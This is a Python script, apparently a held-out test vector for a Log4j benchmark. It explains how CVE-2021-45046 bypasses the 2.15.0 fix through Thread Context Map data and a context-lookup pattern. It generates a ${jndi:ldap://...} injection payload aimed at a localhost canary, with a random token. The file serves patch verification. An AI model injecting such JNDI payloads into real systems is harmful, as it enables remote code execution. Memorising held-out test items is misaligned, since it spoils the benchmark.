#!/usr/bin/env python3
"""[HELD-OUT] CVE-2021-45046 residual for apache-log4j-2-cve-2021-45046.

CVE-2021-44228's 2.15.0 fix disabled message-TEXT lookups by default -- but it did NOT remove
lookups from other layout paths. When the logging configuration uses a non-default Pattern
Layout with a Context Lookup ($${ctx:pcbctx}, present in the shared log4j2.xml) and the attacker
controls the Thread Context Map (MDC) data placed under that key, the value is still interpolated
at log time. So the attacker moves the SAME ${jndi:...} out of the message and into MDC:

    ThreadContext.put("pcbctx", "${jndi:ldap://127.0.0.1:1389/<token>}")
    logger.info("user request received")

At each event the pattern's $${ctx:pcbctx} collapses to ${ctx:pcbctx}, log4j fetches the MDC
value and (on 2.15.0) recursively interpolates it, so ${jndi:...} reaches JndiLookup. The canary
is 127.0.0.1, which is in 2.15.0's DEFAULT allowed-hosts, so the 2.15.0 JndiManager guard lets
the connection through -- faithfully reproducing "the 2.15.0 fix still resolves an allowed JNDI".
The connection fires and the flag is echoed (REACHES on V1). On V2 (2.16.0, CVE-2021-45046
patched) message lookups are removed AND JNDI is disabled by default -> no connection (BLOCKED).

Same JNDI sink as the seed (JndiLookup); the residual only changes WHERE the tainted ${jndi:...}
enters (MDC via the context-lookup pattern) so it survives the message-lookup-only 2.15.0 fix.
"""
import secrets

CANARY = "127.0.0.1:1389"


def _mk(vec_id, mdc_key):
    token = "pcbtok" + secrets.token_hex(8)
    return {
        "id": vec_id,
        "vector": "ctx",
        "mdc_key": mdc_key,
        "token": token,
        "payload": "${jndi:ldap://" + CANARY + "/" + token + "}",
    }


# The context-lookup key MUST match the $${ctx:...} key in the shared log4j2.xml.
VECTORS = [
    {"id": "cve-2021-45046-context-lookup", "mdc_key": "pcbctx"},
]


def candidate(vec):
    return _mk(vec["id"], vec["mdc_key"])


if __name__ == "__main__":
    import json
    print(json.dumps([candidate(v) for v in VECTORS], indent=2))
